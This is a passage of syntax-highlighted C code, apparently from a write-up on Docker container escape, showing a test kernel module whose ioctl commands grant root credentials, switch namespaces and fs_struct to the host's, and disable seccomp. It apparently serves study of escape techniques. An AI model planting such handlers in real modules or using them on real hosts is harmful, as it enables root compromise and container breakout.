rgb(0, 0, 159);">char</span><span class="token operator" style="color: rgb(57, 58, 52);">*</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token plain">task_ </span><span class="token operator" style="color: rgb(57, 58, 52);">+</span><span class="token plain"> fs_offset_</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token plain"> </span><span class="token operator" style="color: rgb(57, 58, 52);">=</span><span class="token plain"> g</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token keyword" style="color: rgb(0, 0, 159);">return</span><span class="token plain"> </span><span class="token number" style="color: rgb(54, 172, 170);">0</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token punctuation" style="color: rgb(57, 58, 52);">}</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain" style="display: inline-block;"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token keyword" style="color: rgb(0, 0, 159);">static</span><span class="token plain"> </span><span class="token class-name">ssize_t</span><span class="token plain"> </span><span class="token function" style="color: rgb(215, 58, 73);">sw_ns_</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token keyword" style="color: rgb(0, 0, 159);">void</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">{</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token class-name">size_t</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token operator" style="color: rgb(57, 58, 52);">*</span><span class="token plain">find_task_by_vpid</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token keyword" style="color: rgb(0, 0, 159);">int</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token plain"> </span><span class="token operator" style="color: rgb(57, 58, 52);">=</span><span class="token plain"> </span><span class="token number" style="color: rgb(54, 172, 170);">0xFFFFFFFF810E6500</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token class-name">size_t</span><span class="token plain"> g </span><span class="token operator" style="color: rgb(57, 58, 52);">=</span><span class="token plain"> </span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token operator" style="color: rgb(57, 58, 52);">*</span><span class="token plain">find_task_by_vpid</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token number" style="color: rgb(54, 172, 170);">1</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token class-name">size_t</span><span class="token plain"> init_nsproxy </span><span class="token operator" style="color: rgb(57, 58, 52);">=</span><span class="token plain"> </span><span class="token number" style="color: rgb(54, 172, 170);">0xFFFFFFFF82E8B000</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token class-name">size_t</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token operator" style="color: rgb(57, 58, 52);">*</span><span class="token plain">switch_task_ns</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token class-name">size_t</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain"> </span><span class="token class-name">size_t</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token plain"> </span><span class="token operator" style="color: rgb(57, 58, 52);">=</span><span class="token plain"> </span><span class="token number" style="color: rgb(54, 172, 170);">0xFFFFFFFF810EECB0</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token operator" style="color: rgb(57, 58, 52);">*</span><span class="token plain">switch_task_ns</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token plain">g</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain"> init_nsproxy</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"> </span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token keyword" style="color: rgb(0, 0, 159);">return</span><span class="token plain"> </span><span class="token number" style="color: rgb(54, 172, 170);">0</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token punctuation" style="color: rgb(57, 58, 52);">}</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain" style="display: inline-block;"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token keyword" style="color: rgb(0, 0, 159);">static</span><span class="token plain"> </span><span class="token class-name">ssize_t</span><span class="token plain"> </span><span class="token function" style="color: rgb(215, 58, 73);">change_parent_cred_</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token keyword" style="color: rgb(0, 0, 159);">void</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">{</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token class-name">size_t</span><span class="token plain"> cred_addr </span><span class="token operator" style="color: rgb(57, 58, 52);">=</span><span class="token plain"> </span><span class="token function" style="color: rgb(215, 58, 73);">prepare_kernel_cred</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token number" style="color: rgb(54, 172, 170);">0</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    current</span><span class="token operator" style="color: rgb(57, 58, 52);">-&gt;</span><span class="token plain">real_parent</span><span class="token operator" style="color: rgb(57, 58, 52);">-&gt;</span><span class="token plain">real_cred </span><span class="token operator" style="color: rgb(57, 58, 52);">=</span><span class="token plain"> cred_addr</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    current</span><span class="token operator" style="color: rgb(57, 58, 52);">-&gt;</span><span class="token plain">real_parent</span><span class="token operator" style="color: rgb(57, 58, 52);">-&gt;</span><span class="token plain">cred </span><span class="token operator" style="color: rgb(57, 58, 52);">=</span><span class="token plain"> cred_addr</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token keyword" style="color: rgb(0, 0, 159);">return</span><span class="token plain"> </span><span class="token number" style="color: rgb(54, 172, 170);">0</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token punctuation" style="color: rgb(57, 58, 52);">}</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain" style="display: inline-block;"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token keyword" style="color: rgb(0, 0, 159);">long</span><span class="token plain"> </span><span class="token function" style="color: rgb(215, 58, 73);">helloioctl</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token keyword" style="color: rgb(0, 0, 159);">struct</span><span class="token plain"> </span><span class="token class-name">file</span><span class="token plain"> </span><span class="token operator" style="color: rgb(57, 58, 52);">*</span><span class="token plain">proc_file</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain"> </span><span class="token keyword" style="color: rgb(0, 0, 159);">unsigned</span><span class="token plain"> </span><span class="token keyword" style="color: rgb(0, 0, 159);">int</span><span class="token plain"> cmd</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain"> </span><span class="token keyword" style="color: rgb(0, 0, 159);">unsigned</span><span class="token plain"> </span><span class="token keyword" style="color: rgb(0, 0, 159);">long</span><span class="token plain"> arg</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">{</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token function" style="color: rgb(215, 58, 73);">printk</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token string" style="color: rgb(227, 17, 108);">":into ioctl!\n"</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token keyword" style="color: rgb(0, 0, 159);">switch</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token plain">cmd</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">{</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">        </span><span class="token keyword" style="color: rgb(0, 0, 159);">case</span><span class="token plain"> </span><span class="token number" style="color: rgb(54, 172, 170);">0x1000</span><span class="token operator" style="color: rgb(57, 58, 52);">:</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">            </span><span class="token function" style="color: rgb(215, 58, 73);">commit_creds</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token function" style="color: rgb(215, 58, 73);">prepare_kernel_cred</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token number" style="color: rgb(54, 172, 170);">0</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain">  </span><span class="token comment" style="color: rgb(153, 153, 136); font-style: italic;">// 更改当前进程 cred</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">            </span><span class="token keyword" style="color: rgb(0, 0, 159);">break</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">        </span><span class="token keyword" style="color: rgb(0, 0, 159);">case</span><span class="token plain"> </span><span class="token number" style="color: rgb(54, 172, 170);">0x1001</span><span class="token operator" style="color: rgb(57, 58, 52);">:</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">            </span><span class="token function" style="color: rgb(215, 58, 73);">set_fs_struct_</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain">  </span><span class="token comment" style="color: rgb(153, 153, 136); font-style: italic;">// 更改当前进程 fs_struct，使其指向 host pid-1 的 fs_struct</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">            </span><span class="token keyword" style="color: rgb(0, 0, 159);">break</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">        </span><span class="token keyword" style="color: rgb(0, 0, 159);">case</span><span class="token plain"> </span><span class="token number" style="color: rgb(54, 172, 170);">0x1002</span><span class="token operator" style="color: rgb(57, 58, 52);">:</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">            </span><span class="token function" style="color: rgb(215, 58, 73);">sw_ns_</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain">  </span><span class="token comment" style="color: rgb(153, 153, 136); font-style: italic;">// 更改 Docker pid-1 的 nsproxy 指向 init_nsproxy</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">            </span><span class="token keyword" style="color: rgb(0, 0, 159);">break</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">        </span><span class="token keyword" style="color: rgb(0, 0, 159);">case</span><span class="token plain"> </span><span class="token number" style="color: rgb(54, 172, 170);">0x1003</span><span class="token operator" style="color: rgb(57, 58, 52);">:</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">            current</span><span class="token operator" style="color: rgb(57, 58, 52);">-&gt;</span><span class="token plain">thread_pid</span><span class="token operator" style="color: rgb(57, 58, 52);">-&gt;</span><span class="token plain">level </span><span class="token operator" style="color: rgb(57, 58, 52);">=</span><span class="token plain"> </span><span class="token number" style="color: rgb(54, 172, 170);">0</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain">  </span><span class="token comment" style="color: rgb(153, 153, 136); font-style: italic;">// 更改当前进程 pid namespace 的 level 值</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">            </span><span class="token keyword" style="color: rgb(0, 0, 159);">break</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">        </span><span class="token keyword" style="color: rgb(0, 0, 159);">case</span><span class="token plain"> </span><span class="token number" style="color: rgb(54, 172, 170);">0x1004</span><span class="token operator" style="color: rgb(57, 58, 52);">:</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">            </span><span class="token operator" style="color: rgb(57, 58, 52);">*</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token keyword" style="color: rgb(0, 0, 159);">unsigned</span><span class="token plain"> </span><span class="token keyword" style="color: rgb(0, 0, 159);">long</span><span class="token operator" style="color: rgb(57, 58, 52);">*</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token keyword" style="color: rgb(0, 0, 159);">char</span><span class="token operator" style="color: rgb(57, 58, 52);">*</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token plain">current</span><span class="token operator" style="color: rgb(57, 58, 52);">+</span><span class="token number" style="color: rgb(54, 172, 170);">8</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token plain"> </span><span class="token operator" style="color: rgb(57, 58, 52);">=</span><span class="token plain"> </span><span class="token number" style="color: rgb(54, 172, 170);">0</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain">  </span><span class="token comment" style="color: rgb(153, 153, 136); font-style: italic;">// 更改当前进程 seccomp 的开关 </span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">            </span><span class="token keyword" style="color: rgb(0, 0, 159);">break</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">        </span><span class="token keyword" style="color: rgb(0, 0, 159);">case</span><span class="token plain"> </span><span class="token number" style="color: rgb(54, 172, 170);">0x1005</span><span class="token operator" style="color: rgb(57, 58, 52);">:</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">            </span><span class="token function" style="color: rgb(215, 58, 73);">change_parent_cred_</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain">  </span><span class="token comment" style="color: rgb(153, 153, 136); font-style: italic;">// 更改父进程的 cred</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">            </span><span class="token keyword" style="color: rgb(0, 0, 159);">break</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">        </span><span class="token keyword" style="color: rgb(0, 0, 159);">default</span><span class="token operator" style="color: rgb(57, 58, 52);">:</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">            </span><span class="token keyword" style="color: rgb(0, 0, 159);">break</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token punctuation" style="color: rgb(57, 58, 52);">}</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token keyword" style="color: rgb(0, 0, 159);">return</span><span class="token plain"> </span><span class="token number" style="color: rgb(54, 172, 170);">0</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token punctuation" style="color: rgb(57, 58, 52);">}</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain" style="display: inline-block;"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token keyword" style="color: rgb(0, 0, 159);">struct</span><span class="token plain"> </span><span class="token class-name">file_operations</span><span class="token plain"> hello_fops </span><span class="token operator" style="color: rgb(57, 58, 52);">=</span><span class="token plain"> </span><span class="token punctuation" style="color: rgb(57, 58, 52);">{</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token punctuation" style="color: rgb(57, 58, 52);">.</span><span class="token plain">owner </span><span class="token operator" style="color: rgb(57, 58, 52);">=</span><span class="token plain"> THIS_MODULE</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token punctuation" style="color: rgb(57, 58, 52);">.</span><span class="token plain">open </span><span class="token operator" style="color: rgb(57, 58, 52);">=</span><span class="token plain"> helloopen</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token punctuation" style="color: rgb(57, 58, 52);">.</span><span class="token plain">read </span><span class="token operator" style="color: rgb(57, 58, 52);">=</span><span class="token plain"> helloread</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token punctuation" style="color: rgb(57, 58, 52);">.</span><span class="token plain">write </span><span class="token operator" style="color: rgb(57, 58, 52);">=</span><span class="token plain"> hellowrite</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token punctuation" style="color: rgb(57, 58, 52);">.</span><span class="token plain">unlocked_ioctl </span><span class="token operator" style="color: rgb(57, 58, 52);">=</span><span class="token plain"> helloioctl</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token punctuation" style="color: rgb(57, 58, 52);">}</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain" style="display: inline-block;"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token keyword" style="color: rgb(0, 0, 159);">static</span><span class="token plain"> </span><span class="token keyword" style="color: rgb(0, 0, 159);">int</span><span class="token plain"> __init </span><span class="token function" style="color: rgb(215, 58, 73);">init_function</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token keyword" style="color: rgb(0, 0, 159);">void</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain"></span><span class="token punctuation" style="color: rgb(57, 58, 52);">{</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token keyword" style="color: rgb(0, 0, 159);">int</span><span class="token plain"> v1</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token keyword" style="color: rgb(0, 0, 159);">struct</span><span class="token plain"> </span><span class="token class-name">device</span><span class="token plain"> </span><span class="token operator" style="color: rgb(57, 58, 52);">*</span><span class="token plain">v2</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"> </span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain" style="display: inline-block;"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token function" style="color: rgb(215, 58, 73);">printk</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token string" style="color: rgb(227, 17, 108);">"hello! a test ko!\\n"</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">    </span><span class="token keyword" style="color: rgb(0, 0, 159);">if</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token plain"> </span><span class="token function" style="color: rgb(215, 58, 73);">alloc_chrdev_region</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token operator" style="color: rgb(57, 58, 52);">&amp;</span><span class="token plain">hellodev_no</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain"> </span><span class="token number" style="color: rgb(54, 172, 170);">0</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain"> </span><span class="token number" style="color: rgb(54, 172, 170);">1</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain"> </span><span class="token string" style="color: rgb(227, 17, 108);">"hellodev"</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token plain"> </span><span class="token operator" style="color: rgb(57, 58, 52);">&gt;=</span><span class="token plain"> </span><span class="token number" style="color: rgb(54, 172, 170);">0</span><span class="token plain"> </span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">{</span><span class="token plain">  </span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">        </span><span class="token function" style="color: rgb(215, 58, 73);">cdev_init</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token operator" style="color: rgb(57, 58, 52);">&amp;</span><span class="token plain">cdev_0</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain"> </span><span class="token operator" style="color: rgb(57, 58, 52);">&amp;</span><span class="token plain">hello_fops</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">        cdev_0</span><span class="token punctuation" style="color: rgb(57, 58, 52);">.</span><span class="token plain">owner </span><span class="token operator" style="color: rgb(57, 58, 52);">=</span><span class="token plain"> THIS_MODULE</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">        test_major </span><span class="token operator" style="color: rgb(57, 58, 52);">=</span><span class="token plain"> </span><span class="token function" style="color: rgb(215, 58, 73);">MAJOR</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token plain">hellodev_no</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">        test_minor </span><span class="token operator" style="color: rgb(57, 58, 52);">=</span><span class="token plain"> </span><span class="token function" style="color: rgb(215, 58, 73);">MINOR</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token plain">hellodev_no</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">        </span><span class="token function" style="color: rgb(215, 58, 73);">printk</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token string" style="color: rgb(227, 17, 108);">"[+] test_major: %d ; test_minor: %d \n"</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain">test_major</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain">test_minor</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">        v1 </span><span class="token operator" style="color: rgb(57, 58, 52);">=</span><span class="token plain"> </span><span class="token function" style="color: rgb(215, 58, 73);">cdev_add</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token operator" style="color: rgb(57, 58, 52);">&amp;</span><span class="token plain">cdev_0</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain"> hellodev_no</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain"> </span><span class="token number" style="color: rgb(54, 172, 170);">1</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">        </span><span class="token keyword" style="color: rgb(0, 0, 159);">if</span><span class="token plain"> </span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token plain"> v1 </span><span class="token operator" style="color: rgb(57, 58, 52);">&gt;=</span><span class="token plain"> </span><span class="token number" style="color: rgb(54, 172, 170);">0</span><span class="token plain"> </span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">{</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">            hellodev_class </span><span class="token operator" style="color: rgb(57, 58, 52);">=</span><span class="token plain"> </span><span class="token function" style="color: rgb(215, 58, 73);">class_create</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token plain">THIS_MODULE</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain"> </span><span class="token string" style="color: rgb(227, 17, 108);">"hellodev_class"</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain">  </span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">            </span><span class="token keyword" style="color: rgb(0, 0, 159);">if</span><span class="token plain"> </span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token plain"> hellodev_class </span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">{</span><span class="token plain"></span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">                v2 </span><span class="token operator" style="color: rgb(57, 58, 52);">=</span><span class="token plain"> </span><span class="token function" style="color: rgb(215, 58, 73);">device_create</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token plain">hellodev_class</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain"> </span><span class="token number" style="color: rgb(54, 172, 170);">0</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain"> </span><span class="token function" style="color: rgb(215, 58, 73);">MKDEV</span><span class="token punctuation" style="color: rgb(57, 58, 52);">(</span><span class="token plain">test_major</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token number" style="color: rgb(54, 172, 170);">0</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain"> </span><span class="token number" style="color: rgb(54, 172, 170);">0</span><span class="token punctuation" style="color: rgb(57, 58, 52);">,</span><span class="token plain"> </span><span class="token string" style="color: rgb(227, 17, 108);">"hellodev"</span><span class="token punctuation" style="color: rgb(57, 58, 52);">)</span><span class="token punctuation" style="color: rgb(57, 58, 52);">;</span><span class="token plain">  </span><br></span><span class="token-line" style="color: rgb(57, 58, 52);"><span class="token plain">                </span><span class="token keyword" style="color: 